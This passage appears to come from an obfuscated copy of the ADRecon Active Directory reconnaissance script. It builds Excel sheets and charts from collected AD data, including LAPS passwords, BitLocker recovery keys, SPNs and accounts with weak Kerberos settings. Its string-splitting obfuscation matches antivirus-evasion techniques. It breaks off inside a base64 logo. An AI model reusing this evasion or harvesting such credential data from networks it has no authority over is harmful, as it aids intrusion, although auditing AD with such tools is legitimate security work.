            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        $ADFileName = -join($ReportPath,'\',('Domain'+'C'+'ontroller'+'s'+'.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Domai'+'n '+'Controlle'+'rs')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('GroupChan'+'ges.'+'csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Grou'+'p C'+'h'+'ange'+'s')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ('Gro'+'up'+' N'+'ame')
        }

        $ADFileName = -join($ReportPath,'\',('DACLs.c'+'s'+'v'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('DAC'+'Ls')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('SAC'+'Ls.c'+'sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('SA'+'CLs')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('GP'+'Os'+'.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('GPO'+'s')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('gP'+'Links.'+'cs'+'v'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('gPLi'+'nk'+'s')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('D'+'NSNod'+'es'),('.'+'csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('DNS '+'Rec'+'o'+'rds')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('DNSZ'+'one'+'s.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('DNS'+' Zo'+'nes')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('Pr'+'inters.'+'csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Prin'+'te'+'rs')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('Bit'+'Lock'+'er'+'Rec'+'overyKey'+'s.'+'csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('B'+'itL'+'ocker')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('L'+'APS.'+'csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('L'+'APS')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('ComputerSP'+'Ns'+'.'+'c'+'sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Comput'+'er'+' '+'SPNs')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ('Use'+'rNam'+'e')
        }

        $ADFileName = -join($ReportPath,'\',('C'+'ompute'+'rs'+'.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('C'+'omp'+'uters')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ('UserN'+'am'+'e')

            $worksheet = $workbook.Worksheets.Item(1)
            # Freeze First Row and Column
            $worksheet.Select()
            $worksheet.Application.ActiveWindow.splitcolumn = 1
            $worksheet.Application.ActiveWindow.splitrow = 1
            $worksheet.Application.ActiveWindow.FreezePanes = $true

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        $ADFileName = -join($ReportPath,'\',('OUs.c'+'s'+'v'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('OU'+'s')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('Group'+'s'+'.'+'csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Gr'+'oups')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ('D'+'isti'+'n'+'guished'+'Na'+'me')
        }

        $ADFileName = -join($ReportPath,'\',('G'+'roupM'+'em'+'bers.'+'csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Group Mem'+'be'+'rs')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ('G'+'roup'+' Name')
        }

        $ADFileName = -join($ReportPath,'\',('UserS'+'PN'+'s.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('User'+' SPN'+'s')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('Users'+'.c'+'sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('U'+'sers')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ('User'+'Na'+'me')

            $worksheet = $workbook.Worksheets.Item(1)

            # Freeze First Row and Column
            $worksheet.Select()
            $worksheet.Application.ActiveWindow.splitcolumn = 1
            $worksheet.Application.ActiveWindow.splitrow = 1
            $worksheet.Application.ActiveWindow.FreezePanes = $true

            $worksheet.Cells.Item(1,3).Interior.ColorIndex = 5
            $worksheet.Cells.Item(1,3).font.ColorIndex = 2
            # Set Filter to Enabled Accounts only
            $worksheet.UsedRange.Select() | Out-Null
            $excel.Selection.AutoFilter(3,$true) | Out-Null
            $worksheet.Cells.Item(1,1).Select() | Out-Null
            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        # Computer Role Stats
        $ADFileName = -join($ReportPath,'\',('ComputerS'+'PNs'+'.c'+'sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Co'+'mp'+'u'+'ter Role Stats')
            Remove-Variable ADFileName

            $worksheet = $workbook.Worksheets.Item(1)
            $PivotTableName = ('Com'+'p'+'ute'+'r SPNs')
            Get-ADRExcelPivotTable -SrcSheetName ('C'+'ompu'+'te'+'r SP'+'Ns') -PivotTableName $PivotTableName -PivotRows @(('Serv'+'ice')) -PivotValues @(('S'+'er'+'vice'))

            $worksheet.Cells.Item(1,1) = ('Compu'+'ter Ro'+'le')
            $worksheet.Cells.Item(1,2) = ('C'+'ount')

            # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
            $worksheet.PivotTables($PivotTableName).PivotFields(('Serv'+'ice')).AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,('Coun'+'t'))

            Get-ADRExcelChart -ChartType ('x'+'lColumn'+'Cl'+'ustered') -ChartLayout 10 -ChartTitle ('Comput'+'er Ro'+'les '+'i'+'n AD') -RangetoCover ('D2:U'+'16')
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , "" , (('4fnCompute'+'r SPNs'+'4'+'fn'+'!A1')  -REPLAce  '4fn',[char]39), "", ('Raw Dat'+'a')) | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
            Remove-Variable PivotTableName

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        # Operating System Stats
        $ADFileName = -join($ReportPath,'\',('Com'+'put'+'ers.'+'csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Op'+'e'+'ra'+'ting System'+' St'+'ats')
            Remove-Variable ADFileName

            $worksheet = $workbook.Worksheets.Item(1)
            $PivotTableName = ('Operati'+'n'+'g Syst'+'em'+'s')
            Get-ADRExcelPivotTable -SrcSheetName ('Com'+'pu'+'ter'+'s') -PivotTableName $PivotTableName -PivotRows @(('Op'+'erating '+'Syste'+'m')) -PivotValues @(('O'+'pe'+'ratin'+'g Sy'+'stem'))

            $worksheet.Cells.Item(1,1) = ('O'+'per'+'a'+'ting Sy'+'stem')
            $worksheet.Cells.Item(1,2) = ('Coun'+'t')

            # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
            $worksheet.PivotTables($PivotTableName).PivotFields(('Ope'+'rating S'+'y'+'s'+'tem')).AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,('Cou'+'nt'))

            Get-ADRExcelChart -ChartType ('xl'+'Column'+'Clu'+'s'+'ter'+'ed') -ChartLayout 10 -ChartTitle ('Opera'+'ting'+' '+'S'+'ys'+'tems i'+'n AD') -RangetoCover ('D'+'2:S16')
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , "" , ('C'+'om'+'puters!'+'A1'), "", ('Raw'+' Dat'+'a')) | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
            Remove-Variable PivotTableName

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        # Group Stats
        $ADFileName = -join($ReportPath,'\',('Group'+'Memb'+'er'+'s.'+'cs'+'v'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Priv'+'ileged'+' Group '+'S'+'t'+'a'+'ts')
            Remove-Variable ADFileName

            $worksheet = $workbook.Worksheets.Item(1)
            $PivotTableName = ('Gr'+'oup M'+'embers')
            Get-ADRExcelPivotTable -SrcSheetName ('G'+'roup M'+'ember'+'s') -PivotTableName $PivotTableName -PivotRows @(('Gr'+'o'+'u'+'p Name'))-PivotFilters @(('Ac'+'c'+'ountT'+'ype')) -PivotValues @(('A'+'ccou'+'ntType'))

            # Set the filter
            $worksheet.PivotTables($PivotTableName).PivotFields(('A'+'cc'+'ou'+'ntType')).CurrentPage = ('u'+'ser')

            $worksheet.Cells.Item(1,2).Interior.ColorIndex = 5
            $worksheet.Cells.Item(1,2).font.ColorIndex = 2

            $worksheet.Cells.Item(3,1) = ('Group N'+'a'+'me')
            $worksheet.Cells.Item(3,2) = ('Co'+'unt ('+'N'+'ot'+'-Recursi'+'ve)')

            $excel.ScreenUpdating = $false
            # Create a copy of the Pivot Table
            $PivotTableTemp = ($workbook.PivotCaches().Item($workbook.PivotCaches().Count)).CreatePivotTable(('R1'+'C5'),('Pi'+'vo'+'tTable'+'Temp'))
            $PivotFieldTemp = $PivotTableTemp.PivotFields(('Grou'+'p Na'+'me'))
            # Set a filter
            $PivotFieldTemp.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlPageField
            Try
            {
                $PivotFieldTemp.CurrentPage = ('Domai'+'n A'+'dmins')
            }
            Catch
            {
                # No Direct Domain Admins. Good Job!
                $NoDA = $true
            }
            If ($NoDA)
            {
                Try
                {
                    $PivotFieldTemp.CurrentPage = ('A'+'d'+'min'+'istr'+'ators')
                }
                Catch
                {
                    # No Direct Administrators
                }
            }
            # Create a Slicer
            $PivotSlicer = $workbook.SlicerCaches.Add($PivotTableTemp,$PivotFieldTemp)
            # Add Original Pivot Table to the Slicer
            $PivotSlicer.PivotTables.AddPivotTable($worksheet.PivotTables($PivotTableName))
            # Delete the Slicer
            $PivotSlicer.Delete()
            # Delete the Pivot Table Copy
            $PivotTableTemp.TableRange2.Delete() | Out-Null

            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotFieldTemp
            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotSlicer
            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotTableTemp

            Remove-Variable PivotFieldTemp
            Remove-Variable PivotSlicer
            Remove-Variable PivotTableTemp

            ('A'+'cc'+'ount Operato'+'rs'),('Admini'+'s'+'tr'+'a'+'tors'),('Back'+'up Op'+'erator'+'s'),('Ce'+'rt P'+'u'+'bl'+'ishers'),('Crypt'+'o O'+'p'+'erators'),('D'+'nsA'+'dmi'+'ns'),('Do'+'main'+' '+'Admins'),('Enterp'+'rise'+' Ad'+'mins'),('E'+'nterprise K'+'ey '+'Ad'+'m'+'ins'),('Incom'+'ing Forest Tru'+'s'+'t B'+'u'+'ilders'),('Ke'+'y Adm'+'ins'),('Mic'+'rosoft Adv'+'anc'+'ed Thr'+'eat'+' Analy'+'tics Adm'+'inistra'+'tors'),('Netwo'+'rk Ope'+'rato'+'rs'),('Pr'+'int '+'Opera'+'t'+'ors'),('Protect'+'ed '+'Use'+'rs'),('Remote D'+'esk'+'top User'+'s'),('Sc'+'hema A'+'dmins'),('Serve'+'r O'+'perators') | ForEach-Object {
                Try
                {
                    $worksheet.PivotTables($PivotTableName).PivotFields(('Gro'+'u'+'p Name')).PivotItems($_).Visible = $true
                }
                Catch
                {
                    # when PivotItem is not found
                }
            }

            # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
            $worksheet.PivotTables($PivotTableName).PivotFields(('Group'+' '+'Name')).AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,('Count (Not'+'-Recu'+'r'+'sive)'))

            $worksheet.Cells.Item(3,1).Interior.ColorIndex = 5
            $worksheet.Cells.Item(3,1).font.ColorIndex = 2

            $excel.ScreenUpdating = $true

            Get-ADRExcelChart -ChartType ('x'+'l'+'Col'+'umnCluster'+'ed') -ChartLayout 10 -ChartTitle ('Privileg'+'ed'+' Group'+'s'+' in AD') -RangetoCover ('D2:'+'P16') -StartRow 'A3' -StartColumn 'B3'
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , "" , (('{0}'+'Group Memb'+'ers{0'+'}'+'!A'+'1')  -F  [CHAr]39), "", ('R'+'aw Data')) | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        # Computer Stats
        $ADFileName = -join($ReportPath,'\',('Comp'+'u'+'t'+'ers.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('C'+'o'+'m'+'puter Sta'+'ts')
            Remove-Variable ADFileName

            $ObjAttributes = New-Object System.Collections.Specialized.OrderedDictionary
            $ObjAttributes.Add(('De'+'l'+'egatio'+'n Typ'),(('IN'+'YUnconstr'+'ai'+'ne'+'d'+'I'+'NY').repLaCe(([ChaR]73+[ChaR]78+[ChaR]89),[sTRInG][ChaR]34)))
            $ObjAttributes.Add(('Delegat'+'i'+'on Type'),(('wdGCons'+'traine'+'dw'+'dG')-CrEpLacE 'wdG',[cHAR]34))
            $ObjAttributes.Add(('SIDH'+'ist'+'or'+'y'),(('ukB*'+'ukB') -cREpLACE ([Char]117+[Char]107+[Char]66),[Char]34))
            $ObjAttributes.Add(('Dorma'+'n'+'t'),(('{0}TRUE'+'{0}')-F[cHAr]34))
            $ObjAttributes.Add((('Passwor'+'d '+'Age ('+'> ')),(('n'+'kpTRUEnkp').RePlACe('nkp',[sTRing][CHaR]34)))
            $ObjAttributes.Add(('ms-ds-Cr'+'eat'+'orSid'),(('{0}*{'+'0'+'}')  -f  [ChAr]34))

            Get-ADRExcelAttributeStats -SrcSheetName ('Computer'+'s') -Title1 ('Compute'+'r Ac'+'cou'+'n'+'t'+'s in'+' AD') -PivotTableName ('Com'+'p'+'ut'+'er Accounts Stat'+'us') -PivotRows ('E'+'nabl'+'ed') -PivotValues ('UserNa'+'me') -PivotPercentage ('Use'+'r'+'Name') -Title2 ('Sta'+'tus '+'of '+'Com'+'puter '+'Accounts') -ObjAttributes $ObjAttributes
            Remove-Variable ObjAttributes

            Get-ADRExcelChart -ChartType ('xl'+'Pie') -ChartLayout 3 -ChartTitle ('Co'+'mput'+'er A'+'ccounts in AD') -RangetoCover ('A11'+':D2'+'3') -ChartData $workbook.Worksheets.Item(1).Range(('A3'+':A4,B3'+':B4'))
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(10,1) , "" , ('Comp'+'u'+'ters!A'+'1'), "", ('Ra'+'w Da'+'ta')) | Out-Null

            Get-ADRExcelChart -ChartType ('xl'+'Ba'+'r'+'Clu'+'stered') -ChartLayout 1 -ChartTitle ('S'+'t'+'atus of'+' Compu'+'ter'+' '+'Accounts') -RangetoCover ('F11:'+'L'+'23') -ChartData $workbook.Worksheets.Item(1).Range(('F'+'2:F8'+',G2:'+'G8'))
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(10,6) , "" , ('Co'+'mp'+'u'+'ters!A1'), "", ('Raw'+' D'+'ata')) | Out-Null

            $workbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
        }

        # User Stats
        $ADFileName = -join($ReportPath,'\',('User'+'s'+'.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('User '+'St'+'ats')
            Remove-Variable ADFileName

            $ObjAttributes = New-Object System.Collections.Specialized.OrderedDictionary
            $ObjAttributes.Add(('Mu'+'st Change Pass'+'word '+'at'+' Lo'+'g'+'o'+'n'),(('{0}'+'TR'+'UE{0}')  -F [chaR]34))
            $ObjAttributes.Add(('Cannot C'+'hange Pas'+'s'+'wor'+'d'),(('MmKT'+'RUE'+'MmK')-crEpLACe  'MmK',[chAr]34))
            $ObjAttributes.Add(('Passw'+'ord'+' Nev'+'er '+'Expires'),(('C'+'5'+'pTRUEC5p')  -cReplaCE  ([CHar]67+[CHar]53+[CHar]112),[CHar]34))
            $ObjAttributes.Add(('Reve'+'rsible Passwor'+'d '+'En'+'crypt'+'ion'),(('9c'+'sTR'+'UE9cs').repLace(([chAr]57+[chAr]99+[chAr]115),[striNg][chAr]34)))
            $ObjAttributes.Add(('Smar'+'tca'+'rd '+'Lo'+'gon Req'+'u'+'ired'),(('{0'+'}'+'TRU'+'E{0}') -f [CHar]34))
            $ObjAttributes.Add(('D'+'elegation Pe'+'r'+'mit'+'ted'),(('4dSTR'+'UE4d'+'S').rePLaCe(([CHaR]52+[CHaR]100+[CHaR]83),[STRING][CHaR]34)))
            $ObjAttributes.Add(('Ke'+'rberos DES'+' O'+'nly'),(('9'+'Z'+'k'+'TRUE9Zk')  -cREPlACE'9Zk',[cHar]34))
            $ObjAttributes.Add(('Kerber'+'os '+'RC'+'4'),(('{0'+'}T'+'RU'+'E{0}')  -F[cHAr]34))
            $ObjAttributes.Add(('Doe'+'s No'+'t Req'+'u'+'i'+'re '+'Pre '+'Auth'),(('{0}TRUE'+'{0}') -f[char]34))
            $ObjAttributes.Add((('Pas'+'s'+'word Ag'+'e '+'(> ')),(('{0}TRUE{'+'0}')  -F [CHaR]34))
            $ObjAttributes.Add(('Account'+' Loc'+'k'+'e'+'d Out'),(('d'+'JwTR'+'U'+'EdJw').rePLAce(([ChAR]100+[ChAR]74+[ChAR]119),[STRing][ChAR]34)))
            $ObjAttributes.Add(('Never '+'Log'+'ge'+'d in'),(('{0}TR'+'UE{0}')  -F  [CHAr]34))
            $ObjAttributes.Add(('Do'+'rmant'),(('bL'+'eT'+'RUEbLe').rEpLaCE('bLe',[StRIng][chaR]34)))
            $ObjAttributes.Add(('Pas'+'sword No'+'t '+'R'+'eq'+'ui'+'red'),(('{0'+'}T'+'RUE'+'{0}')  -f[chAr]34))
            $ObjAttributes.Add(('D'+'ele'+'gation T'+'yp'),(('ZA'+'Q'+'Un'+'const'+'rai'+'ned'+'ZAQ').REplaCE('ZAQ',[sTRiNg][chAR]34)))
            $ObjAttributes.Add(('SIDH'+'ist'+'ory'),(('0'+'un*0u'+'n')-CREpLace'0un',[ChAr]34))

            Get-ADRExcelAttributeStats -SrcSheetName ('User'+'s') -Title1 ('U'+'s'+'er '+'Ac'+'coun'+'ts in AD') -PivotTableName ('User Account'+'s Sta'+'t'+'us') -PivotRows ('Enable'+'d') -PivotValues ('U'+'se'+'rName') -PivotPercentage ('Use'+'rName') -Title2 ('Status of'+' '+'U'+'ser Accoun'+'ts') -ObjAttributes $ObjAttributes
            Remove-Variable ObjAttributes

            Get-ADRExcelChart -ChartType ('xlP'+'ie') -ChartLayout 3 -ChartTitle ('User Ac'+'co'+'unts '+'i'+'n'+' AD') -RangetoCover ('A21'+':D3'+'3') -ChartData $workbook.Worksheets.Item(1).Range(('A3:A4,B'+'3'+':B4'))
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(20,1) , "" , ('U'+'sers!A1'), "", ('R'+'a'+'w Data')) | Out-Null

            Get-ADRExcelChart -ChartType ('xlBarC'+'l'+'us'+'tered') -ChartLayout 1 -ChartTitle ('Status '+'of Us'+'er A'+'c'+'cou'+'nts') -RangetoCover ('F2'+'1:L43') -ChartData $workbook.Worksheets.Item(1).Range(('F'+'2:F1'+'8,G2:'+'G18'))
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(20,6) , "" , ('Use'+'rs!'+'A1'), "", ('Raw'+' D'+'ata')) | Out-Null

            $workbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
        }

        # Create Table of Contents
        Get-ADRExcelWorkbook -Name ('Table of'+' C'+'on'+'te'+'nts')
        $worksheet = $workbook.Worksheets.Item(1)

        $excel.ScreenUpdating = $false
        # Image format and properties
        # $path = "C:\ADRecon_Logo.jpg"
        # $base64adrecon = [convert]::ToBase64String((Get-Content $path -Encoding byte))

		$base64adrecon = ('/9j/4AAQSkZJRgABAQAASABI'+'AAD/4QBMRX'+'hpZgAATU0AKgAA'+'AAgAAgESAAMAAAABAA'+'EAAId'+'pAAQAAAABAAAAJgAAAAAAAqACAAQA'+'AAABAAAA6qADAAQAAAABAAAARgAAAAD/7QA4UGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAAA4QklNBCUAAAAAABDUHYzZjwCyBOmAC'+'Zjs+EJ+/+ICoElDQ19QUk9GS'+'UxFAAEBAAACkGxjbX'+'MEMAAAbW50clJHQiBYWVogB+IAAwAbAAUANwAO'+'YWNzcEFQUEwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPbWAAEAAAAA0y1sY21zAAAAAAAA'+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALZGVzYwAAAQgAAAA4Y3BydAAAAUAAAABOd3RwdAAAAZAAAAAUY2hhZ'+'AAAAaQAAAAsclhZWgAAAdAAAAAUYlhZ'+'WgAAAeQAAAAUZ1hZWgAAAfgAAAAUclR'+'SQwAAAgwAAAAgZ1'+'RSQwAAAiwAAAA'+'gYlRSQwAAAkwAAA'+'AgY2hybQAAAmwAAAAkbWx1YwAAAAA'+'AAAABAAAADGVuVVMAAAAcAAAAHABzAFIARwBCACAAYgB1AGkAbAB0AC0AaQBuAA'+'BtbHVjAAAAAAAAAA'+'EAAA'+'AMZW5VUwAAADIAAAAcAE4AbwAgAGMA'+'bwBwAHkAcgBpAGcAaAB0ACwAIAB1AHMAZQAgAGYAcgBl'+'AGU'+'AbAB5AAAAAFhZWiAAAAAAAAD21gAB'+'AAAAANM'+'tc2YzMgAAAAAAAQxKAAA'+'F4///8yoAAAebAAD9h///+6L///2jAAAD2AAAwJRYWVogAAAAAAAAb5QA'+'ADjuA'+'AADkF'+'hZWiAAAAAAAAAknQAAD4MAALa+WFlaIAAAAAAAAGKlAAC3'+'kAAAGN5wYXJhAAAAAAADAAAAAmZmA'+'ADypwAADVkAABPQAAAKW3BhcmE'+'AAAAAAAMAAAACZmYAAPKnA'+'AANWQAAE9AAAApbcGFyYQAAAAAAAwAAAAJmZgAA8qcAAA1ZAAAT0AAACltjaHJtAAAAAAAD'+'AAAAAKPXAABUewAATM0'+'AAJmaAA'+'AmZgAAD1z/wg'+'ARCAB'+'GAOoDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQE'+'AAAAAAAAAAwIEAQUABgcICQoL/8Q'+'AwxAAAQMDAgQDBAYEBw'+'YECAZz'+'AQIAAxEEEiEFMRMiEAZBUTIUYXEjB4EgkUIVoVIzsSRiMBbBctFDkjSCCOF'+'TQCVjFzXwk3OiUESyg'+'/EmVDZklHTCY'+'NKEoxhw4idFN2WzVXWklcOF8tNGdoDjR1ZmtAkKGRooKS'+'o4OTpISUpXWFlaZ2hpand4eXqGh4iJipCWl5iZmqClpqeoqaqwtba3uLm6wMTFxsfIycrQ1NXW19jZ2uDk5ebn6Onq8/T19vf4+fr/xAAfAQA'+'DAQEBAQEBAQEBAAAAAAABAgADBAUGBwgJCg'+'v/xADDEQACAgEDAwMCAwU'+'CBQIEBIcBAAIRAxASIQQgMUETB'+'TAiMlEUQAYzI2FCFXFSNIFQJJGhQ7EWB2'+'I1U/DRJWDBROFy8ReCYzZwJkVUkiei0ggJCh'+'gZGigpKjc4OTpGR'+'0hJSlVWV1hZWmRlZmdoaWpzdHV2d3h5eoCDhIWGh4iJipCTlJWWl5iZmqCjpKWmp6ipqrCys7S1tre4ubrAwsPExcbHyM'+'nK0NPU1dbX2Nna4OLj5'+'OXm5+jp6vLz9PX29/j5+v/bAE'+'MAB'+'QMEBAQDBQQEBA'+'UFBQYHDAgHBwcHDwsLCQwRDxISEQ8RERMWHBcTFBo'+'VEREYIRgaHR0fHx8TFyIkIh4kHB4fHv/bAEMBB'+'QUFBwYHDggIDh4UERQeHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e'+'Hh4eHh4eHh4eHh4eHh4eHh4eHh4eHv/a'+'AAwDAQ'+'ACEQMRAAAB8'+'w2n2fNjTqjTqjTqjTqjTqjTqjTqjbVttW21'+'bTqjbVtOqNtWnFj2dP3RuXfy/wBc8p7JltuB5/0A3n/ovL93R63zjqgeYbdbzW2TafWaxH84lRtc2+9ZJjp5Fry8deGn12oVvOJV2jpxMdh2CN5BF9Q6LPWcn63m3L'+'WtzY4bedXiFuvm/W8l32ubDq+'+'E7nJw1WZVx/rPk3rDqO08uCjX3UeW+pk'+'eYAIHfO27PjOyy0856zketdVdXynU46c4HlundF8d2PHsHnZcDmEummZfVLzw/Ya+vcNzWZd6P5xnUvWcdqu0U+r1xXkGze8RT7RPXFeQbN+h6bznMPXmHmGUu+8842il6DmsR03MTqjbFdtq22rbattq22'+'r'+'battq22rbattq22rbattq22r/2gAIAQEAAQUC/wB/o1O0bfFDJ'+'uVhLGvbY0y393t+w2quT4Ze5WEsa34U2+0vLYweGQdxtNomtbmCW3'+'l/1FD+98Zf7Sty/wCMP'+'2f/AGp+O/8AGntV5Juad9s0'+'WO4e'+'Cv8AafP+/wDCqVI3bxYpKt5hiXIpHh7bCjd9ksreyUlSTDEuRSPD22FH9Hdre82kVr'+'uGxb'+'Tb3cX9Hdre77JZW9kpK'+'knw9tMO4W2zbXFc3afDe'+'2qO+2aLHcO2x7Sb+Pft2F9BZ3v6UsxZGw8'+'QeO/8afhL/a14v/2teBxlZSeFFqXuu5BFk/BCQqyX4WlUvadgXZXvi7/a14'+'LA9wnUrn'+'5Ke0a7'+'p456brJT8J6714v/ANrXgc0svEG8JvkeEyf014v/ANrXbwPQWS942ML2vctquLzd/wDjLvHf+NP'+'Z7OXbTv8AdxXu4+Cf8Q2bePdL7eNunU'+'H4J/xCa9u+d79eOSRcqvBX+0+f9+9n/wBqfjv/ABp+Ev8Aa34v/wBrXgr'+'/AGnz/v8Awl/tb8X/AO1p2XKN3ut7DYqJqbS4ltZtqud'+'snjvp9hvVcnwy903CVXbwpe2ttZTGsu1bgZl72LRN/t9/c2jTH4bUnk'+'+GXvYtE3+33'+'9zaNMfhtSeT4Ze6qt4N02y6sr9HJ8Mu/k2mz'+'t7u4lupvCl7a21lMay+GporfdfE08Vxuv8'+'Av9//2gAIAQMRAT8B/YDEeGPEbbEmA+6ndfFJHL7ZafaLt5fbKIkmkYyUhxi5IH'+'PlIqJYeWJ+9NV9ri/E74sDc22P4Cw/Ex/Gg3Jn+JEq091M7YypEqdz7jufcROn3P6IlRtBpJv9g//aAAgBAhEBPwH9gEz+L83ICZgO04+XLL7LDs2i7Yy+2y+/HT34pmALRniy'+'kIi05ohBsW5p'+'bY'+'2Emo/hQblFyn7XJ/CRd1Nz/gfbmR5'+'cgrGhl'+'/EDk/CWf8IMogQcf4AmFm2k4ObtjjpnHcKZRsO3ii+z/V28UX2f6px2'+'EYf6soCQpIsUxG0V+wf/2gAIAQEABj8C/wB/tGpe7x8uJQ6CpyXEUJ'+'91r0K8qOGNYqlStWE3ATGTwqX7cf4uSeKE+616FeVO0'+'y7mPLEuhXH+LKNsxXc+QHF8uZBQr0P+o0fN2v8At+Tj+Qdv/bcH9ntHtEwAipxHFqt4ySkDzd1/t+TX/aLjkWClFD1Hg1lKgRiODGKFEV1oGkm71p+0GqW2mMsnkkGropJB+LGKFEV1oGkm71p+0'+'H/jn+9BmC3VzE0+b'+'kVeLVCQdK6P/HP96DVL'+'bTGWTySDV0UCD8XN'+'JIpQKOFHLHdFUSE8CdHRN0Sfgpqt4ySkDz7rnEuHKPBothEU8'+'o8fVx7OEcs09t